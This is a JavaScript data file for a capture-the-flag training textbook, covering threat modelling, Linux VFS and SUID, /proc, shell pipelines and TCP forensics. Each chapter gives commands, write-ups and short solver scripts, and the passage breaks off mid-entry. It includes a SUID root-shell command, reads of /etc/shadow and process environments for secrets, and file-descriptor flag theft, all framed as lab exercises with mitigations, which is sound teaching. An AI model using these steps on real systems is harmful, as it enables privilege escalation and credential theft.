/* CTF Atlas — Master Textbook & Knowledge Vault v3.0 */
/* Zero-backend educational knowledge base & tournament writeups */
'use strict';

window.TEXTBOOK_CHAPTERS = {
  "foundations-threat-model": {
    "id": "foundations-threat-model",
    "domain": "foundations",
    "category": "Foundations & Threat Modeling",
    "title": "CTF Problem Solving Anatomy, CIA Triad & Trust Boundaries",
    "subtitle": "Scientific Hypothesis Cycles, Data-Flow Deconstruction & Reproducible Evidence Chains",
    "diagram": "+-------------------------------------------------------------------+\n|               The Scientific CTF Solver Cycle                     |\n+-------------------------------------------------------------------+\n       1. TRIAGE & OBSERVE          2. MODEL TRUST BOUNDARIES\n   Identify Category Clues      Draw 4-Box Architecture\n   Check Magic Bytes / Strings   Map Client -> API -> DB -> Host\n              |                                 |\n              v                                 v\n       3. FORM HYPOTHESIS           4. REVERSIBLE EXPERIMENT\n   \"System is vulnerable to X   Change single variable (payload)\n    because invariant Y broke\"  Log raw request and response\n              |                                 |\n              +----------------+----------------+\n                               |\n                               v\n                       5. PROVE & REPRODUCE\n                 Construct minimal 1-line script\n                 Validate flag token: CTF{...}\n                 Document defensive invariant breach",
    "theory": "Capture The Flag (CTF) challenges are designed not as random puzzles, but as observable deterministic state machines with specific security boundary violations. Beginners often fail because they guess random payloads or blindly run automated scanners without understanding the underlying state machine.\n\nCore Security Invariants & The CIA Triad:\n1. Confidentiality: Preserving authorized restrictions on access and disclosure. In CTF, broken by unauthorized read primitives: SQLi data extraction, local file inclusion (/etc/passwd), memory disclosure leaks (puts(GOT)), or cryptographic key recovery.\n2. Integrity: Guarding against improper information modification or destruction. Broken by write primitives: stack return address overwrites, SQL UPDATE injection, CSRF, or deserialization object tampering.\n3. Availability: Ensuring timely and reliable access. In Attack/Defense CTFs, SLA (Service Level Agreements) mandate uptime while patching vulnerabilities.\n4. Authenticity & Authorization: Authenticity establishes identity (Who are you? e.g. Passwords, PKI); Authorization establishes privilege (What are you permitted to do?). The most common real-world and CTF bugs live at the authorization boundary: Insecure Direct Object References (IDOR), privilege escalation via SUID or sudo, and role confusion.\n\nTrust Boundary Modeling:\nA trust boundary exists wherever data transitions between two disparate execution contexts or privilege domains:\n- Browser DOM <-> HTTP Reverse Proxy <-> Backend Application (Flask/Express/Spring)\n- Application Server <-> SQL Database Engine / Redis Cache\n- Web Service <-> Operating System Shell (via execve/system)\n- Unprivileged User Process <-> Linux Kernel Space (via syscalls/VFS)\nVulnerabilities occur almost exclusively at trust boundaries where the receiving system assumes data has been validated by the sender.",
    "commands": [
      {
        "cmd": "curl -sI https://target.ctf | grep -iE 'server|x-powered-by|set-cookie'",
        "why": "Extracts HTTP response headers to identify web server technology, runtime versions, and session flags.",
        "when": "First 10 seconds of web challenge reconnaissance.",
        "internals": "Performs TCP handshake and issues HTTP HEAD request; parses initial header token lines.",
        "pitfalls": "Modern proxies often strip or spoof header banners. Treat headers as clues, not proofs."
      },
      {
        "cmd": "file target_artifact && strings -n 8 target_artifact | head -n 30",
        "why": "Determines authoritative file type via magic bytes and inspects human-readable strings.",
        "when": "First step upon downloading any mystery binary, firmware, or memory dump.",
        "internals": "file uses libmagic pattern database; strings scans binary stream for 8+ sequential ASCII chars.",
        "pitfalls": "Attacker could forge file extension; never rely on filename suffix."
      },
      {
        "cmd": "nc -zv -w 2 target.ctf 1-1000",
        "why": "Fast non-intrusive TCP port scan across common service ports.",
        "when": "Initial network discovery on remote infrastructure.",
        "internals": "Issues non-blocking connect() syscalls with a 2-second timeout.",
        "pitfalls": "Full connect scan creates logged connections on firewalled targets."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Terminal pipeline: `curl -s http://target/ | htmlq 'a' --attribute href | sort -u` to extract all endpoints instantaneously.",
      "gui_workflow": "Burp Suite: Configure browser proxy -> Target tab -> Site Map -> View tree view of endpoints and parameter taxonomy.",
      "speed_tip": "Keep a split terminal with tmux: left pane for target interaction (curl/nc/gdb), right pane for Python solver script editor."
    },
    "triage_workflow": [
      "1. Read the prompt twice. Extract literal keywords, developer names, and subtle hints.",
      "2. Inspect Artifacts: Run `file`, `ls -la`, and `sha256sum` on all provided challenge files.",
      "3. Draw Data-Flow: Map inputs, interpreters, databases, and expected flag location.",
      "4. Form Falsifiable Hypothesis: Predict exactly what output should appear upon test input.",
      "5. Execute Minimal Test: Use curl or raw socket; avoid heavy scanners initially.",
      "6. Exploit & Document: Write a self-contained Python script to extract and display the flag."
    ],
    "writeup": {
      "ctf_event": "Collegiate CTF / National Cyber League",
      "challenge_name": "Sanity Check & Triage Discipline",
      "scenario": "A target server hosts a mystery service on port 1337. Players are given no source code.",
      "solve_steps": [
        "1. Connect via netcat: nc target.ctf 1337",
        "2. Observe prompt: 'Enter authorization token hex:'",
        "3. Test basic input: send '00' -> returns 'Invalid length: expected 32 bytes'",
        "4. Hypothesize fixed token check: provide 32 bytes of zeros.",
        "5. Server returns: 'XOR verification failed at index 0: expected 0x43, got 0x00'.",
        "6. Notice server is acting as an index-by-index oracle leaking the expected bytes!",
        "7. Write Python script to iterate 32 bytes, reading the expected byte leaked by error message.",
        "8. Flag recovered: CTF{THINK_M0D3L_EXP3R1M3NT_PR0V3}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport socket\n\ndef solve():\n    s = socket.create_connection(('target.ctf', 1337))\n    token = bytearray(32)\n    for idx in range(32):\n        s.sendall(token.hex().encode() + b'\\n')\n        resp = s.recv(1024).decode()\n        if 'CTF{' in resp:\n            print(\"[+] Flag:\", resp)\n            return\n        if 'expected 0x' in resp:\n            leak_hex = resp.split('expected 0x')[1][:2]\n            token[idx] = int(leak_hex, 16)\n            print(f\"[+] Byte {idx}: {token[idx]:02x}\")\n\nif __name__ == '__main__':\n    solve()",
      "flag": "CTF{THINK_M0D3L_EXP3R1M3NT_PR0V3}",
      "mitigation": "Avoid leaking internal cryptographic comparison mismatches or validation offsets to end users. Perform comparisons in constant time."
    }
  },
  "linux-vfs": {
    "id": "linux-vfs",
    "domain": "linux",
    "category": "Systems & Kernel Internals",
    "title": "POSIX Virtual Filesystem (VFS) Architecture & Inode Exploitation",
    "subtitle": "Virtual Filesystem Switch, Inode Allocation, Permission Octets & SUID Privilege Escalation",
    "diagram": "+-------------------------------------------------------------+\n|                      User Space Process                     |\n|  read(fd, buf, count)  --> System Call Interface (int 0x80) |\n+------------------------------+------------------------------+\n                               |\n+------------------------------v------------------------------+\n|            Linux Kernel Virtual Filesystem (VFS)            |\n|  +------------------+  +------------------+  +-----------+  |\n|  | file descriptor  |  | dentry (dcache)  |  | superblock|  |\n|  | struct file      |->| filename -> inode|  | filesystem|  |\n|  +------------------+  +--------+---------+  +-----------+  |\n|                                 |                           |\n|                        +--------v--------+                  |\n|                        |  struct inode   |                  |\n|                        |  - i_mode bits  | (04755 = SUID)   |\n|                        |  - i_uid / i_gid|                  |\n|                        |  - atime/mtime/ |                  |\n|                        |  - i_block[15]  |                  |\n|                        +--------+--------+                  |\n+---------------------------------+---------------------------+\n                                  |\n            +---------------------+---------------------+\n            v                     v                     v\n      +-----------+         +-----------+         +-----------+\n      | ext4/xfs  |         |   procfs  |         |   tmpfs   |\n      | disk block|         | /proc/PID |         | shared mem|\n      +-----------+         +-----------+         +-----------+",
    "theory": "The Linux Virtual Filesystem Switch (VFS) provides a standardized kernel abstraction layer over disparate concrete storage engines (ext4, XFS, Btrfs, NFS) and synthetic pseudo-filesystems (procfs, sysfs, tmpfs). Every user-space filesystem call\u2014such as open(), read(), write(), and stat()\u2014is intercepted by the VFS dispatch table and routed to the corresponding operations table (struct inode_operations or struct file_operations) implemented by the active filesystem module.\n\nThe kernel filesystem representation relies on four primary core data structures:\n1. Superblock Object (struct super_block): Stores global metadata for an entire mounted filesystem, including block size, allocation bitmaps, filesystem magic identifier (e.g. 0xEF53 for ext2/3/4), total and free inode counters, and mount flags (e.g. MS_NODEV, MS_NOSUID, MS_RDONLY). In privilege escalation attacks, identifying filesystems mounted WITHOUT the 'nosuid' option is essential for staging SUID binary payloads.\n2. Inode Object (struct inode): Represents an abstract file or directory entity independent of human-readable directory tree paths. Each inode is indexed by a filesystem-unique 64-bit integer (inode number). Inodes store critical metadata: permission mode bits (16-bit field encoding file type and access permissions), owner UID, group GID, file byte size (i_size), hard link counter (i_nlink), block pointer map, and three POSIX timestamps (atime, mtime, ctime). Note that the filename is NOT stored inside the inode\u2014it resides inside directory data blocks mapped by directory entries.\n3. Directory Entry Object (struct dentry): Associates directory path components with corresponding inode numbers. The dentry cache (dcache) retains recent path lookup resolutions in kernel memory to minimize expensive physical disk accesses. Hard links are simply multiple dentry structures pointing to the exact same underlying inode number.\n4. File Object (struct file): Represents an active open file descriptor held by a process in user space. It maintains runtime state including current seek offset (f_pos), access flags (O_RDONLY, O_WRONLY, O_CREAT), reference counts, and a pointer to the associated dentry.",
    "commands": [
      {
        "cmd": "find / -perm -4000 -type f 2>/dev/null",
        "why": "Identifies all binaries across the system that execute with SetUID (effective UID of owner, typically root).",
        "when": "Immediate post-compromise reconnaissance after obtaining initial low-privilege shell.",
        "internals": "Queries inode i_mode bits checking bitwise mask S_ISUID (04000). Standard output errors (stderr) are redirected to /dev/null to suppress unreadable permission warnings.",
        "pitfalls": "Excludes SetGID (02000) binaries. Use -perm /6000 to search for SUID OR SGID binaries simultaneously."
      },
      {
        "cmd": "ls -lai /usr/bin/find /usr/local/bin/find",
        "why": "Displays inode numbers (-i), file ownership, permissions, and links to verify whether an executable has been tampered with or replaced.",
        "when": "Validating candidate binaries flagged during SUID enumeration.",
        "internals": "Invokes lstat() system call to read st_ino, st_mode, st_uid, and st_gid from the inode.",
        "pitfalls": "Be aware that relative path aliases or PATH environment hijacking can lead you to execute a different binary than intended."
      },
      {
        "cmd": "stat -c '%a %n %U (%u)' /etc/shadow",
        "why": "Displays numeric octal permissions, owner username, and numeric UID of sensitive configuration files.",
        "when": "Auditing target files for misconfigured write or read permissions.",
        "internals": "Directly decodes the 16-bit st_mode integer returned by stat64() syscall.",
        "pitfalls": "Filesystem ACLs (Access Control Lists) indicated by a '+' trailing symbol in ls -l may grant permissions not visible in octal representation."
      },
      {
        "cmd": "cat /proc/mounts | grep -v 'nosuid'",
        "why": "Discovers writable partitions where SUID execution is permitted by the kernel mount flags.",
        "when": "Planning where to compile and drop a SUID payload.",
        "internals": "Reads kernel struct vfsmount flags directly from the VFS mount namespace table.",
        "pitfalls": "/dev/shm and /tmp are frequently mounted with 'nosuid,noexec' on hardened production systems."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Enumerate SUID: `find / -perm -4000 -type f 2>/dev/null | grep -v '/snap'` -> Cross reference results with GTFOBins -> Execute GTFOBins bypass recipe -> Verify UID: `id` -> Read flag.",
      "gui_workflow": "In desktop Linux/VMs: Open File Manager (Nautilus/Thunar) -> Properties -> Permissions tab -> Observe 'Execute as program' and special bits. However, CTF competitions strictly restrict access to headless SSH/reverse shells, making terminal mastery mandatory.",
      "speed_tip": "Run `find / -perm -4000 -type f -exec ls -ld {} + 2>/dev/null` to obtain a long listing of all SUID files in a single fast process batch instead of spawning ls per item."
    },
    "triage_workflow": [
      "1. Enumerate Current Context: Run `id`, `whoami`, `groups`, and inspect environment variables (`env`).",
      "2. Enumerate Special Executables: Run `find / -perm -4000 -type f 2>/dev/null` to locate SUID binaries.",
      "3. Cross-Reference GTFOBins: Check discovered binaries against the GTFOBins repository (e.g. find, cp, bash, python, vim, env, nmap).",
      "4. Audit PATH Hijacking: Inspect writable directories in $PATH: `echo $PATH` and `find / -writable -type d 2>/dev/null`.",
      "5. Execute Privilege Escalation: Invoke the GTFOBins vector (e.g. `find . -exec /bin/sh -p \\; -quit`).",
      "6. Validate Root Context & Extract Flag: Run `id` (must show euid=0), then `cat /root/flag.txt`."
    ],
    "writeup": {
      "ctf_event": "Collegiate Cyber Defense / HackTheBox Proving Grounds",
      "challenge_name": "Inception-SUID (Linux Privilege Escalation)",
      "scenario": "A target server exposes an SSH service with default student credentials (ctf:password). The goal is to escalate to root and recover /root/flag.txt.",
      "solve_steps": [
        "1. Connect via SSH: ssh ctf@target.lab",
        "2. Enumerate SUID binaries: find / -perm -4000 -type f 2>/dev/null",
        "3. Result reveals non-standard binary: /usr/local/bin/find owned by root with 4755 permissions (-rwsr-xr-x).",
        "4. Check GTFOBins recipe for find: The -exec option executes commands without dropping privileges if the shell is invoked with -p.",
        "5. Execute exploit: /usr/local/bin/find /root -name 'flag*' -exec cat {} \\;",
        "6. Alternatively, spawn interactive root shell: /usr/local/bin/find . -exec /bin/sh -p \\; -quit",
        "7. Read flag: cat /root/flag.txt -> CTF{SUID_GT_F0_Bins_R00t}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess\n\ndef exploit_suid():\n    cmd = \"/usr/local/bin/find /root -name flag.txt -exec cat {} \\;\"\n    res = subprocess.check_output(cmd, shell=True, text=True)\n    print(\"[+] Recovered Flag:\", res.strip())\n\nif __name__ == '__main__':\n    exploit_suid()",
      "flag": "CTF{SUID_GT_F0_Bins_R00t}",
      "mitigation": "Mount user-writable partitions (/tmp, /home) with the 'nosuid' mount option. Audit all custom binaries and remove the SUID bit using `chmod u-s /usr/local/bin/find` unless strictly necessary."
    }
  },
  "linux-proc-ipc": {
    "id": "linux-proc-ipc",
    "domain": "linux",
    "category": "Systems & Kernel Internals",
    "title": "Linux Process Architecture, /proc Pseudo-FS & IPC Exploitation",
    "subtitle": "Task Structs, File Descriptor Manipulation, Memory Maps & Environment Variable Leaks",
    "diagram": "+-----------------------------------------------------------------+\n|               Linux /proc/[PID]/ Kernel Subsystem               |\n+-----------------------------------------------------------------+\n/proc/[PID]/\n  |-- cmdline      -> Null-delimited command arguments\n  |-- environ      -> Environment variables (secret API keys, passwords)\n  |-- cwd          -> Symlink to process current working directory\n  |-- exe          -> Symlink to executing ELF binary (carve deleted bin)\n  |-- fd/          -> Open file descriptors (0:stdin, 1:stdout, 2:stderr)\n  |     |-- 3      -> Symlink to /root/flag.txt (opened by parent!)\n  |     +-- 4      -> Unix Domain Socket to internal daemon\n  |-- maps         -> Virtual memory addresses & ASLR base layout\n  |-- mem          -> Raw process memory bytes (readable via ptrace)\n  +-- status       -> Process capabilities, UID/GID, Seccomp filters",
    "theory": "The Linux operating system represents processes via kernel `struct task_struct` instances. The `/proc` filesystem (procfs) is a synthetic pseudo-filesystem generated on-the-fly by the kernel to expose process internals, device drivers, and kernel parameters to user space without requiring dedicated system calls.\n\nProcess Inspection & Forensic Goldmines:\n1. Environment Variable Recovery (`/proc/[PID]/environ`): When processes spawn (via `fork()` + `execve()`), they inherit or define environment variables. Developers frequently pass database credentials, private keys, and flag strings via environment variables (e.g. `FLAG=CTF{...}`). In CTF challenges featuring Local File Inclusion (LFI) or path traversal on Linux servers, reading `/proc/self/environ` or `/proc/1/environ` directly leaks these secrets.\n2. File Descriptor Leaks (`/proc/[PID]/fd/`): If a privileged daemon opens a sensitive file (like `/root/flag.txt`) and subsequently executes an unprivileged child process or script without setting the `FD_CLOEXEC` (Close-on-Exec) flag, the open file descriptor remains inherited and active in the child. Even if permissions on the file forbid read access, the child can read the content directly via `/proc/self/fd/3`.\n3. Executable Recovery (`/proc/[PID]/exe`): If an administrator or challenge creator deletes a running binary from disk (`rm /opt/vuln_server`), the inode is unlinked but its data blocks persist in memory as long as the process runs. Solvers can dump and reconstruct the exact deleted ELF binary by running `cp /proc/[PID]/exe ./recovered_binary`.\n4. Memory Mapping Layout (`/proc/[PID]/maps`): Exposes the exact start and end virtual addresses, permission flags (rwxp), and mapped files (libc.so.6, ld.so, heap, stack). If PIE and ASLR are active, reading `/proc/self/maps` immediately bypasses ASLR by providing exact base addresses.",
    "commands": [
      {
        "cmd": "tr '\\0' '\\n' < /proc/self/environ",
        "why": "Dumps all environment variables formatted with newlines instead of null bytes.",
        "when": "Immediately upon achieving remote command execution or LFI.",
        "internals": "Reads task_struct->mm->env_start through env_end.",
        "pitfalls": "Requires read permissions on the target PID's proc directory."
      },
      {
        "cmd": "ls -l /proc/*/fd/* 2>/dev/null | grep flag",
        "why": "Finds any active process that currently holds an open file descriptor pointing to a flag file.",
        "when": "Privilege escalation enumeration on multi-user or service-hosted CTF targets.",
        "internals": "Procfs fd directory contains symbolic links representing active struct file references.",
        "pitfalls": "Requires elevated privileges to read other users' fd directories on modern kernels with ptrace_scope enabled."
      },
      {
        "cmd": "cat /proc/sys/kernel/yama/ptrace_scope",
        "why": "Checks whether non-root processes can attach debuggers (gdb/strace) to sibling processes.",
        "when": "Assessing process memory injection or sniffing opportunities.",
        "internals": "0 = classic ptrace permissions; 1 = restricted to direct descendants; 2 = admin-only; 3 = disabled.",
        "pitfalls": "Values >= 1 prevent cross-process memory reading without root privileges."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "CLI: `ps aux | grep -i target` -> `cat /proc/<PID>/cmdline | tr '\\0' ' '` -> extract secrets in 2 seconds.",
      "gui_workflow": "HTop / GNOME System Monitor: Visual process tree view, CPU/RAM charts. Does not expose raw file descriptors or memory maps as cleanly as procfs.",
      "speed_tip": "Use `grep -s -r 'FLAG' /proc/[0-9]*/environ 2>/dev/null` to search all accessible process environments for flags in one shot."
    },
    "triage_workflow": [
      "1. Identify Current Process Context: `cat /proc/self/status`.",
      "2. Enumerate Running Daemons: `ps auxww` or `ls -d /proc/[0-9]*`.",
      "3. Audit Process Environments: Check `/proc/1/environ` (Docker/Init) and other user PIDs.",
      "4. Audit Inherited File Descriptors: Inspect `ls -la /proc/self/fd/`.",
      "5. Inspect Memory Layout: `cat /proc/self/maps` to discover loaded library paths.",
      "6. Intercept System Calls: If permitted, run `strace -p <PID>` to capture plaintext I/O."
    ],
    "writeup": {
      "ctf_event": "HackTheBox / OverTheWire",
      "challenge_name": "Ghost-In-Proc (Descriptor Leaks)",
      "scenario": "A setuid wrapper binary opens /root/flag.txt, drops privileges to 'ctf', and executes an interactive Python shell. The file /root/flag.txt is 0400 root:root.",
      "solve_steps": [
        "1. Spawned into Python shell as user 'ctf'.",
        "2. Attempting `open('/root/flag.txt').read()` fails with PermissionError.",
        "3. Check open file descriptors in current process: `import os; print(os.listdir('/proc/self/fd'))` -> reveals descriptors [0, 1, 2, 3].",
        "4. Check destination of fd 3: `os.readlink('/proc/self/fd/3')` -> returns `/root/flag.txt`!",
        "5. Read content from inherited descriptor: `os.read(3, 100).decode()`.",
        "6. Flag recovered: CTF{FD_CLOEXEC_FORGOTTEN_BY_DEV}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport os\n\ndef solve():\n    flag = os.read(3, 128).decode()\n    print(\"[+] Flag from FD 3:\", flag.strip())\n\nif __name__ == '__main__':\n    solve()",
      "flag": "CTF{FD_CLOEXEC_FORGOTTEN_BY_DEV}",
      "mitigation": "Always set O_CLOEXEC or invoke fcntl(fd, F_SETFD, FD_CLOEXEC) on sensitive file descriptors before executing lower-privileged processes."
    }
  },
  "linux-pipelines": {
    "id": "linux-pipelines",
    "domain": "linux",
    "category": "Shell & Automation",
    "title": "POSIX Shell Pipelines, Stream Redirection & Stream Parsers",
    "subtitle": "File Descriptors 0/1/2, Anonymous Pipes, Sed/Awk Byte Transformation & Forensic Grep",
    "diagram": "+-----------------------------------------------------------------+\n|                  POSIX Shell Stream Processing                  |\n+-----------------------------------------------------------------+\n[ Producer ]               [ Filter ]                [ Reducer ]\ncat access.log  ---|pipe|---> awk '{print $7}' --|pipe|-> sort | uniq -c\n(stdout -> fd 1)          (stdin 0 -> stdout 1)      (Aggregates top hits)\n      |\n      +---> 2>/dev/null  (Redirects stderr / fd 2 to null device)\n      +---> &> full.log   (Redirects both stdout & stderr to file)\n      +---> 2>&1 | tee    (Merges error stream into stdout pipe)",
    "theory": "The Unix philosophy emphasizes building modular utilities that perform a single function comprehensively, combined through standardized byte streams. The POSIX standard establishes three default file descriptors for every process: Standard Input (`stdin`, fd 0), Standard Output (`stdout`, fd 1), and Standard Error (`stderr`, fd 2).\n\nStream Redirection Mechanics:\n- `>` and `>>`: Overwrite and append redirection of fd 1 to a concrete file.\n- `2>`: Redirects fd 2 (errors) to suppress permission warnings or save crash dumps.\n- `2>&1`: Duplicates file descriptor 2 to point to wherever fd 1 currently points. Order matters: `cmd > file 2>&1` directs both streams to `file`.\n- `|` (Anonymous Pipe): The kernel creates a unidirectional memory buffer (typically 64KB) linking the stdout of the upstream process to the stdin of the downstream process. Both processes execute concurrently.\n\nThe Essential Forensic Stream Tooling:\n1. `awk`: A pattern scanning and data processing language. Operates record-by-record (default newline) and field-by-field (default whitespace). `awk '{print $1, $4}'` extracts fields; `awk '$3 == 404 {count++} END {print count}'` computes metrics.\n2. `sed`: Stream editor for filtering and transforming text using regular expressions. `sed -n 's/.*flag{\\(.*\\)}.*/\\1/p'` extracts captured patterns.\n3. `xargs`: Converts standard input lines into CLI arguments for another executable. Critical when handling tens of thousands of files where shell globbing (`*`) hits `ARG_MAX` buffer limits.",
    "commands": [
      {
        "cmd": "awk -F: '$3 == 0 {print $1}' /etc/passwd",
        "why": "Extracts all usernames with UID 0 (root privileges) using colon delimiter.",
        "when": "Auditing Linux users for rogue administrative accounts.",
        "internals": "Splits record buffer at ':' bytes and evaluates numeric equality on field 3.",
        "pitfalls": "Some systems use LDAP or NIS which do not appear in local /etc/passwd."
      },
      {
        "cmd": "grep -oE '[a-zA-Z0-9_]{32}' evidence.log | sort | uniq -c | sort -nr | head -10",
        "why": "Extracts 32-character MD5 hashes or tokens, deduplicates, and ranks by frequency.",
        "when": "Analyzing forensic server logs for credential dumping or brute-force attempts.",
        "internals": "Performs regex match compilation; pipe transfers buffers through memory pages.",
        "pitfalls": "Ensure PCRE or Extended regex (-E) is enabled when using quantifier braces."
      },
      {
        "cmd": "find . -type f -name '*.txt' -print0 | xargs -0 grep -l 'CTF{'",
        "why": "Safely searches for flag strings in filenames containing spaces, quotes, or newlines.",
        "when": "Scanning extracted archive trees with messy or malicious filenames.",
        "internals": "Uses null byte delimiter (\\0) instead of whitespace.",
        "pitfalls": "Omitting -0 when files have spaces causes xargs to split single filenames into multiple arguments."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Grep/Awk/Sed pipelines process 1GB log files in under 2 seconds directly in RAM.",
      "gui_workflow": "Text editors (VS Code / Sublime) often freeze or crash when loading 500MB+ log dumps.",
      "speed_tip": "Set `LC_ALL=C` before running `grep` or `sort` across large files: `LC_ALL=C grep 'pattern' big.log` runs 5x-10x faster by bypassing UTF-8 validation."
    },
    "triage_workflow": [
      "1. Identify File Structure: Inspect first 5 lines with `head -n 5 log.txt`.",
      "2. Count Total Records: `wc -l log.txt` to assess dataset volume.",
      "3. Isolate Key Delimiters: Determine whether data is CSV, TSV, JSON, or whitespace.",
      "4. Filter Noise: Use `grep -v` to remove known normal traffic.",
      "5. Aggregate Anomalies: Pipe through `sort | uniq -c | sort -n`.",
      "6. Extract Target Tokens: Use `grep -oE 'CTF\\{[^\\}]+\\}'`."
    ],
    "writeup": {
      "ctf_event": "PicoCTF / Bandit",
      "challenge_name": "Log-Sifting (Million-Line Triage)",
      "scenario": "A web server log containing 2,000,000 requests is provided. One IP address made a single request containing the flag in its User-Agent string.",
      "solve_steps": [
        "1. Triage file size: 250 MB text log.",
        "2. Rank IP frequencies: `awk '{print $1}' access.log | sort | uniq -c | sort -n | head -5`.",
        "3. IP `198.51.100.42` appears exactly once.",
        "4. Extract log line for this IP: `grep '^198.51.100.42' access.log`.",
        "5. User-Agent contains base64 string: `VGFyZ2V0OiBDVEZ7UElQRUxJTkVfTUFTVEVSXzIwMjZ9`.",
        "6. Decode string: `echo '...' | base64 -d`.",
        "7. Flag: CTF{PIPELINE_MASTER_2026}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nimport subprocess\n\ndef solve():\n    cmd = \"awk '{print $1}' access.log | sort | uniq -c | sort -n | head -1 | awk '{print $2}'\"\n    rare_ip = subprocess.check_output(cmd, shell=True, text=True).strip()\n    line = subprocess.check_output(f\"grep '^{rare_ip}' access.log\", shell=True, text=True)\n    print(\"[+] Unique Line:\", line)\n\nif __name__ == '__main__':\n    solve()",
      "flag": "CTF{PIPELINE_MASTER_2026}",
      "mitigation": "Ingest logs into structured SIEM platforms (Elasticsearch/Splunk) and alert on single-occurrence anomalies and high-entropy User-Agent strings."
    }
  },
  "networking-tcp": {
    "id": "networking-tcp",
    "domain": "networking",
    "category": "Network Architecture & Protocols",
    "title": "TCP State Machine, Packet Framing & Stream Reconstruction",
    "subtitle": "Three-Way Handshake, Sequence Arithmetic, Sliding Windows & PCAP Forensics",
    "diagram": "Client (Port: Ephemeral 49152)             Server (Port: 80/443)\n      |                                              |\n      | -------- 1. SYN (seq=x) -------------------> | [LISTEN -> SYN_RCVD]\n      |                                              |\n      | <------- 2. SYN-ACK (seq=y, ack=x+1) ------- | \n[SYN_SENT -> ESTABLISHED]                            |\n      |                                              |\n      | -------- 3. ACK (seq=x+1, ack=y+1) --------> | [ESTABLISHED]\n      |                                              |\n      | <====== Full-Duplex Bidirectional Data =====>|\n      |                                              |\n      | -------- 4. FIN (seq=u) -------------------> | [CLOSE_WAIT]\n[FIN_WAIT_1]                                         |\n      | <------- 5. ACK (ack=u+1) ------------------ |\n[FIN_WAIT_2]                                         |\n      | <------- 6. FIN (seq=w) -------------------- | [LAST_ACK]\n[TIME_WAIT (2*MSL)]                                  |\n      | -------- 7. ACK (ack=w+1) -----------------> | [CLOSED]",
    "theory": "The Transmission Control Protocol (TCP, RFC 793 / RFC 9293) is a connection-oriented, reliable transport-layer protocol providing byte-stream delivery with end-to-end flow control and congestion avoidance. Unlike UDP, which transmits stateless independent datagrams, TCP requires mutual state establishment via a 3-Way Handshake before user-space application data (HTTP, SSH, TLS) can be transferred.\n\nEvery TCP packet consists of a 20-to-60 byte header:\n- Source Port (16 bits) and Destination Port (16 bits): Endpoint multiplexing.\n- Sequence Number (32 bits): Tracks the offset of the first data byte in this segment relative to the Initial Sequence Number (ISN).\n- Acknowledgment Number (32 bits): Indicates the next byte offset the receiving host expects to receive (cumulative acknowledgment).\n- Data Offset (4 bits): Header length in 32-bit words (minimum 5 = 20 bytes).\n- Flags (9 bits): URG (urgent pointer valid), ACK (acknowledgment valid), PSH (push data to application immediately), RST (reset connection abruptly), SYN (synchronize sequence numbers), FIN (sender finished transmitting).\n- Window Size (16 bits): Flow control buffer capacity advertised by receiver.\n\nIn CTF network forensics, solvers analyze packet captures (PCAP) to reconstruct communications. Common puzzles include: (1) extracting unencrypted credentials transmitted over HTTP/FTP/Telnet, (2) carving hidden attachments transported over multipart MIME or raw TCP streams, (3) identifying covert channels that encode data in TCP initial sequence numbers (ISN) or IP TTL headers, and (4) detecting port scans by analyzing SYN/RST ratios.",
    "commands": [
      {
        "cmd": "tshark -r capture.pcap -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri",
        "why": "Extracts all HTTP GET/POST endpoints visited by target clients without opening a graphical interface.",
        "when": "Initial rapid triage of high-volume network packet captures.",
        "internals": "Wireshark dissection engine filters frame layers and prints requested field values per matching packet.",
        "pitfalls": "Misses HTTPS/TLS traffic unless TLS session pre-master keys (SSLKEYLOGFILE) are provided."
      },
      {
        "cmd": "tcpdump -nn -r capture.pcap 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'",
        "why": "Filters raw SYN packets to identify port scan sources and enumeration attempts.",
        "when": "Detecting malicious scanners or mapping attack timelines in blue-team/forensics challenges.",
        "internals": "Evaluates BPF (Berkeley Packet Filter) byte bytecode directly in kernel space: byte 13 of TCP header masked with 0x02.",
        "pitfalls": "Syn-Ack packets also have the SYN bit set; the condition must explicitly enforce ACK == 0."
      },
      {
        "cmd": "tshark -r capture.pcap --export-objects http,./extracted_files",
        "why": "Carves and reconstructs all files, images, executables, and scripts transferred over unencrypted HTTP sessions.",
        "when": "CTF forensics challenges containing malware downloads or stolen data exfiltration.",
        "internals": "Reassembles fragmented TCP streams, decompresses GZIP Content-Encoding, and writes payloads to disk using HTTP Content-Disposition/URI filenames.",
        "pitfalls": "Does not automatically extract chunked transfer-encoded files if TCP segments are missing."
      },
      {
        "cmd": "tshark -r capture.pcap -z follow,tcp,ascii,0",
        "why": "Prints the entire bidirectional conversational ASCII transcript of TCP stream index 0.",
        "when": "Reading interactive Telnet, FTP, SMTP, or reverse shell sessions.",
        "internals": "Reorders out-of-order packets by sequence number and prints client (out) and server (in) text data.",
        "pitfalls": "Binary protocols will produce garbled terminal characters. Use hex or raw mode for binary protocols."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Tshark / Tcpdump: Fast, scriptable, filterable via grep/awk, ideal for servers and CTF automation pipelines. Example: `tshark -r cap.pcap -Y 'tcp.port == 4444' -T fields -e data | xxd -r -p`.",
      "gui_workflow": "Wireshark GUI: Right-click packet -> 'Follow' -> 'TCP Stream'. Provides visual color-coding (red for client, blue for server), packet diagram inspection, and visual conversation statistics. Press Ctrl+F to search strings in packet bytes.",
      "speed_tip": "In Wireshark, use `frame contains \"flag{\"` or `frame contains \"CTF{\"` in the display filter to immediately jump to the packet containing the flag."
    },
    "triage_workflow": [
      "1. Protocol Hierarchy Statistics: Run `tshark -r traffic.pcap -qz io,phs` to see dominant protocols.",
      "2. Conversation Mapping: Run `tshark -r traffic.pcap -qz conv,ip` to identify high-volume communication pairs.",
      "3. String Triage: Run `strings traffic.pcap | grep -iE 'flag\\{|CTF\\{|password|token'` for quick wins.",
      "4. Follow Suspicious Streams: Inspect unusual ports (e.g. 1337, 4444, 8080) using TCP stream following.",
      "5. Carve Artifacts: Export HTTP objects or reconstruct binary payloads using Wireshark / Foremost."
    ],
    "writeup": {
      "ctf_event": "PicoCTF / National Cyber League",
